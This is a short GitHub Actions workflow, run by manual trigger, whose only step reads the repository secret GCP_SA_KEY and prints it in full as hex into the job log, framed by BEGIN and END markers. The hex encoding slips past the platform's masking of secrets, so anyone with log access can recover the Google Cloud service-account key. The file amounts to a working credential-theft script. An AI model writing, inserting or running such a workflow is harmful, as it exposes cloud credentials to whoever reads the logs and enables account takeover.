name: c211-i126233-gcp2
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          G: ${{ secrets.GCP_SA_KEY }}
        run: |
          set +x
          v="${G}"; echo "BEGIN G ${#v}"; printf '%s' "$v" | od -An -v -tx1 | tr -d '\n'; echo; echo "END G"
